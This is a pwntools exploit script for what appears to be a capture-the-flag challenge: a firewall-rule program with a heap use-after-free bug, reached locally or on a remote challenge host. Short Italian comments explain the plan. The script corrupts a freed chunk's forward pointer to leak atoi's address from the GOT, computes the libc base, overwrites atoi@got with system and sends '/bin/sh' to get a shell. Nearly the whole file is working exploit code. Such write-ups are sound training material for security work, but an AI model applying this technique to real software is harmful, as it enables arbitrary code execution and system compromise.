#!/usr/bin/env python3

from pwn import *

exe = ELF("./uaf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ["tmux", "splitw",'-vf','-p','65']
# context.terminal = ['gnome-terminal','-x']

def conn():
    if args.LOCAL:
    	r = gdb.debug(exe.path,gdbscript='''
            b *create+121
            b *del+305
            b *edit+238
            
            ''')
    elif args.PROCESS:
        r = process([exe.path])
    else:
        r = remote("host1.metaproblems.com", 5600)

    return r


def main():
    r = conn()

    # good luck pwning :)

    '''
    use-after-free vulnerability: corrupt the fw pointer!:

    alloca un chunk, poi free e edit con "rules[]"
    alloca altro chunk (che punta a atoi@got)
    stampa atoi@plt (view = **rules) e poi overwrite atoi@got con system 
    (edit = edit **rules)
    '''

    atoi_got = p64(exe.got.atoi)

    # create new rule    
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b'Enter your firewall rule here:',b'a')

    # free
    r.sendlineafter(b'> ',b'4')
    r.sendlineafter(b'you want to delete:',b'0')

    # corrupt fd to point to rules (to obtain a leak by viewing rules)
    r.sendlineafter(b'>',b'3')
    r.sendline(b'0')
    r.sendline(p64(exe.sym.rules))
    # r.interactive()
    
    # re-allocate chunk with corrupted fd
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b'Enter your firewall rule here:',b'a')


    # new chunk pointing to atoi@got -> atoi@plt (will be allocated in rules)
    r.sendlineafter(b'>',b'1')
    r.sendline(atoi_got)

    # leak atoi@plt address
    r.sendlineafter(b'>',b'2')
    r.sendline(b'0')
    r.recvuntil(b'Your rule: ')
    leak = u64(r.recv(6).ljust(8,b'\x00'))
    print(hex(leak))

    libc.address = leak - libc.sym.atoi

    # edit atoi@got to point to system
    r.sendlineafter(b'>',b'3')
    r.sendline(b'0')
    r.sendline(p64(libc.sym.system))
    # r.interactive()
    r.sendline(b'/bin/sh')
    
    r.interactive()


if __name__ == "__main__":
    main()
